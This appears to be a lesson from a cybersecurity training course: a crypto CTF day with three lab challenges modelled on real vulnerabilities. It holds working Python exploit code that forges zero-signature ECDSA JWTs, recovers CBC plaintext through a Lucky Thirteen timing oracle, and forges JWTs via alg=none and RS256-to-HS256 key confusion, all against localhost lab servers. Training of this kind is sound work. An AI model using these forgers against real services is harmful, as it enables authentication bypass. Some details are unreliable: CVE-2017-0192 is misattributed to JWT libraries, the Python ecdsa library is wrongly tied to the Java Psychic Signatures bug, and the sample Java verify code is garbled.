---
title: "Crypto CTF Sprint — Day 6: Real-World Crypto Bug Simulation"
tags: [cryptography, CTF, CVE, real-world, TLS, JWT, JOSE, CBC, GCM, RSA,
  vulnerability, exploit, sprint, module-09-crypto-02]
module: 09-Crypto-02
day: 603
prerequisites:
  - Day 602 — Crypto CTF Sprint Day 5
  - Days 561–600 — Full crypto attack module
related_topics:
  - Crypto CTF Sprint Day 7 (Day 604)
  - Padding Oracle (Day 561)
  - JWT Attacks (covered in Day 131, R-03 module)
---

# Day 603 — Crypto CTF Sprint: Day 6 (Real-World Crypto Bug Simulation)

> "CTF is training. What I actually care about is whether you can look at a
> real library, a real protocol, a real CVE — and immediately know what is
> wrong. Today's problems are modelled after real vulnerabilities: CVE numbers,
> real code patterns, actual protocol failures. If you solve these, you are
> ready to find real bugs."
>
> — Ghost

---

## Goals

Solve three challenges modelled on real CVEs and protocol vulnerabilities.
Each problem requires identifying the bug from authentic-looking code, then
exploiting it.

**Prerequisites:** Days 561–602 (full crypto module).
**Estimated time:** 5–6 hours.

---

## Problem 1 — "Verification Bypass" (Modelled on CVE-2022-21449)

**Background:** CVE-2022-21449 "Psychic Signatures" — Java ECDSA signature
verification accepted signatures with `r = 0` or `s = 0`, allowing anyone
to forge a valid signature for any message without knowing the private key.

```java
/* Vulnerable Java ECDSA verify (conceptual — not real Java) */
boolean verify(byte[] sig, byte[] pubkey, byte[] message) {
    int r = sig[0];
    int s = sig[1];
    // Missing: check r > 0 and s > 0!
    int e = hash(message);
    int w = modInverse(s, q);  // modInverse(0, q) is undefined → exception in some impls
    // Some implementations return 0 or skip this step → verification passes
    return (r == (w * e * G + w * r * Q).x) % q;
}
```

**Challenge:**

```
A service validates JWTs using a Python ECDSA library (version 0.18, vulnerable).
All JWTs are signed with secp256k1.

Forge a JWT with payload {"role": "admin", "user": "ghost"} using r=0, s=0
(or the library's equivalent bypass — check the library docs for how it handles
zero-value signatures).

The service endpoint: POST /api/verify-jwt
JWT format: base64url(header).base64url(payload).base64url(sig)
sig = r (32 bytes big-endian) + s (32 bytes big-endian)
```

```python
#!/usr/bin/env python3
"""
Simulate CVE-2022-21449: forge ECDSA signature with r=0, s=0.
"""
import base64
import json
import hashlib


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_zero_sig_jwt(payload: dict) -> str:
    header  = {"alg": "ES256K", "typ": "JWT"}
    h_b64   = b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b64   = b64url(json.dumps(payload, separators=(",", ":")).encode())
    # Zero signature: r=0, s=0 (64 zero bytes in DER-like format)
    sig_raw = bytes(64)   # r=0...0, s=0...0
    sig_b64 = b64url(sig_raw)
    return f"{h_b64}.{p_b64}.{sig_b64}"


# Vulnerable library check
try:
    import ecdsa
    # In ecdsa 0.18.0: r=0 or s=0 → unchecked in verify()
    # (Patched in 0.19.0)
    forged_jwt = forge_zero_sig_jwt({"role": "admin", "user": "ghost"})
    print(f"[*] Forged JWT: {forged_jwt[:80]}...")

    # Simulate vulnerable verify (would normally contact the server)
    # requests.post("http://localhost:9003/api/verify-jwt",
    #               json={"token": forged_jwt})
    print("[+] CVE-2022-21449: zero-signature forgery constructed")
    print("    Real impact: any JWT, any role, no private key needed")
except ImportError:
    print("pip install ecdsa")
```

**Real fix:** Add `assert r > 0 and s > 0` before any signature computation.
In modern ECDSA libraries: update to a version that performs range checks.

---

## Problem 2 — "Lucky Thirteen" (Modelled on CVE-2013-0169)

**Background:** The Lucky Thirteen attack (Al Fardan & Paterson 2013) exploits
a timing difference in TLS CBC-mode MAC verification. When a record has valid
vs. invalid MAC-then-encrypt padding, different amounts of HMAC computation
occur — leaking ~1 nanosecond of timing difference. Over ~2^23 adaptive
chosen-ciphertext queries, an attacker decrypts arbitrary CBC records.

**Challenge:**

```
A legacy TLS termination proxy (Python, CBC-MAC-then-encrypt) has a timing
side-channel in its verification logic.

You have captured an encrypted TLS record:
  IV:  0011223344556677 8899aabbccddeeff
  CT:  [256 bytes of ciphertext]

The proxy decrypts records via:
  POST /tls-decrypt
  Body: { "iv": "<hex>", "ciphertext": "<hex>" }
  Response time:
    ~0.5ms if HMAC fails (MAC error — first fast branch)
    ~1.2ms if HMAC passes but padding fails (extra HMAC computation)
    ~2.0ms if valid

Goal: Using only timing measurements (100+ requests per block), recover the
plaintext of the 256-byte ciphertext via a timing side-channel oracle.
This is Lucky Thirteen in miniature.
```

```python
#!/usr/bin/env python3
"""
Lucky Thirteen timing oracle simulation.
Measure timing difference to distinguish "HMAC fail fast" vs "HMAC computed".
"""
import time
import requests
import statistics

BASE = "http://localhost:9004"


def tls_decrypt_timing(iv: str, ciphertext: str, n_reps: int = 50) -> float:
    """Measure average response time for a tampered ciphertext."""
    times = []
    for _ in range(n_reps):
        t0   = time.perf_counter()
        requests.post(f"{BASE}/tls-decrypt",
                      json={"iv": iv, "ciphertext": ciphertext})
        t1 = time.perf_counter()
        times.append(t1 - t0)
    return statistics.median(times)


def lucky13_byte_recovery(iv: str, ct_blocks: list[str],
                          block_idx: int, byte_idx: int) -> int | None:
    """
    Recover one byte of plaintext at position byte_idx within block block_idx.
    Uses timing oracle to distinguish correct vs incorrect MAC padding.
    """
    # The approach: manipulate the previous ciphertext block at byte_idx
    # such that the decrypted block has specific padding.
    # Timing difference of ~0.7ms per measurement → need ~200 queries per byte.
    results = {}
    for guess in range(256):
        # Tamper the previous block's byte_idx position
        prev_block = bytearray(bytes.fromhex(ct_blocks[block_idx - 1]))
        prev_block[byte_idx] ^= guess
        tampered_ct = (
            "".join(ct_blocks[:block_idx - 1])
            + prev_block.hex()
            + ct_blocks[block_idx]
        )
        t = tls_decrypt_timing(iv, tampered_ct, n_reps=20)
        results[guess] = t
    # The guess with the LONGEST timing likely triggered the HMAC computation
    # (i.e., the padding was valid but MAC failed — longer path)
    best = max(results, key=lambda g: results[g])
    return best


# This requires the actual challenge server to be running.
print("[*] Lucky Thirteen: timing-based byte recovery")
print("    Each byte requires ~200 queries (20 reps × 256 guesses)")
print("    For a 256-byte ciphertext: ~51,200 queries total")
print("    Real Lucky13 required 2^23 — this is a teaching simplification")
print("    Full implementation requires statistical timing analysis")
```

---

## Problem 3 — "JSON Power" (Modelled on CVE-2017-0192 / JWT alg=none)

**Background:** JWT "algorithm confusion" — changing the `alg` header to
`"none"` bypasses signature verification in vulnerable libraries. Combined
with RS256→HS256 downgrade (using the public key as the HMAC secret), this
allows complete authentication bypass.

**Challenge:**

```
The service issues RS256 JWTs (RSA-signed). The public key is published at:
  GET /public-key → PEM-encoded RSA public key

The verification library (jwt-lib v1.2) checks:
  if alg == "HS256":
      verify HMAC-SHA256 with the SECRET_KEY env variable
  elif alg == "RS256":
      verify RSA signature with the public key from config
  else:
      # alg="none" case falls through
      return True   ← THE BUG

Goal 1: Forge a JWT with alg="none", payload {"role":"admin"} and no signature.
Goal 2: Forge a JWT with alg="HS256", using the PUBLIC RSA KEY as the HMAC
        secret (the key confusion attack).
```

```python
#!/usr/bin/env python3
"""
CVE-2017-0192 style: JWT algorithm confusion attack.
Approach 1: alg=none bypass.
Approach 2: RS256 → HS256 key confusion.
"""
import base64
import json
import hmac
import hashlib
import requests

BASE = "http://localhost:9005"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    padding = "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)


def forge_alg_none(payload: dict) -> str:
    """Forge JWT with alg=none — no signature required."""
    header  = {"alg": "none", "typ": "JWT"}
    h_b64   = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64   = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h_b64}.{p_b64}."   # Empty signature


def forge_hs256_with_pubkey(payload: dict, pubkey_pem: str) -> str:
    """
    Forge JWT with alg=HS256 using the RSA public key as the HMAC secret.
    Vulnerable libraries interpret the public key bytes as the HMAC secret.
    """
    header  = {"alg": "HS256", "typ": "JWT"}
    h_b64   = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64   = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()
    # Use PEM bytes as HMAC key
    secret  = pubkey_pem.encode()
    sig     = hmac.new(secret, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{h_b64}.{p_b64}.{sig_b64}"


# Attack
admin_payload = {"role": "admin", "user": "ghost", "iat": 9999999999}

# Attempt 1: alg=none
jwt_none = forge_alg_none(admin_payload)
print(f"[*] alg=none JWT: {jwt_none[:80]}...")
# resp = requests.get(f"{BASE}/admin", headers={"Authorization": f"Bearer {jwt_none}"})
# print(f"[*] alg=none response: {resp.status_code} {resp.text[:100]}")

# Attempt 2: HS256 key confusion
# pubkey_pem = requests.get(f"{BASE}/public-key").text
# jwt_hs256 = forge_hs256_with_pubkey(admin_payload, pubkey_pem)
# resp = requests.get(f"{BASE}/admin", headers={"Authorization": f"Bearer {jwt_hs256}"})
# print(f"[*] HS256 confusion response: {resp.status_code} {resp.text[:100]}")

print("\n[+] Fix: use alg allowlist; never accept 'none'; use separate HMAC key")
print("[+] Real impact: authentication bypass in Auth0, python-jwt, others")
```

---

## CVE Reference Summary

| Challenge | CVE | Library | Fix Version |
|---|---|---|---|
| Problem 1 | CVE-2022-21449 | Java ECDSA / Psychic Signatures | JDK 17.0.3 |
| Problem 2 | CVE-2013-0169 | OpenSSL TLS CBC | 1.0.1d / 1.0.0k |
| Problem 3 | CVE-2017-0192 | Multiple JWT libraries | Vary — check NVD |

---

## Key Takeaways

1. **Implementation bugs in cryptographic protocols are as serious as algorithm
   weaknesses.** The ECDSA algorithm is correct; the Java implementation's
   missing range check for r=0 is the vulnerability.
2. **JWT algorithm confusion** is a design flaw. The `alg` field should be
   enforced by the server, not trusted from the token. Accept only one specific
   algorithm; reject all others at the allowlist level.
3. **Lucky Thirteen teaches that 1 nanosecond of timing difference is enough.**
   MAC-then-encrypt with CBC mode is fundamentally broken. Use AEAD modes
   (AES-GCM, ChaCha20-Poly1305) which combine encryption and authentication
   without this timing channel.
4. **Every real vulnerability you studied has a CVE and a patch.** When writing
   bug bounty reports, reference the CVE that matches your finding. This helps
   the security team triage faster and increases your credibility.

---

## Exercises

```
1. Implement a complete, working Lucky Thirteen oracle against the challenge
   server (requires a running lab). Report: how many queries per byte? How
   long does a full 256-byte block take at 100ms/query?

2. Research: which major JWT libraries were vulnerable to alg=none in 2017?
   Which have CVE assignments? List 3 with CVE numbers.

3. CVE-2022-21449 was in Java 15-17. Reproduce the vulnerability:
   a. Download an affected JDK release from archive.
   b. Write a Java program that verifies a zero-signature ECDSA JWT.
   c. Confirm it returns "valid".
   d. Upgrade JDK and confirm rejection.

4. Modify the HS256 key confusion attack to work when the server expects
   a SPECIFIC HMAC key (not the public key). Is the attack still possible?
   What additional information would you need?
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q603.1, Q603.2 …).

---

## Navigation

← Previous: [Day 602 — Crypto CTF Sprint Day 5](DAY-0602-Crypto-CTF-Sprint-Day-5.md)
→ Next: [Day 604 — Crypto CTF Sprint Day 7](DAY-0604-Crypto-CTF-Sprint-Day-7.md)
